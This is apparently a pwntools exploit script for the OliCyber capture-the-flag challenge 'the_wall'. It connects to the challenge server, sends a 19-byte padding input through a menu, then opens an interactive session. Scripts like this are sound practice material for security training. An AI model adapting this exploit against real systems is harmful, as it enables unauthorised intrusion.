from pwn import *

exe = ELF("./the_wall")

context.binary = exe

HOST = "thewall.challs.olicyber.it"
PORT = 21007

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r = conn()

    r.sendlineafter(b": ", b"1")
    r.sendlineafter(b": ", b"a" * 19)

    r.sendlineafter(b": ", b"2")
    
    r.interactive()

if __name__ == "__main__":
    main()
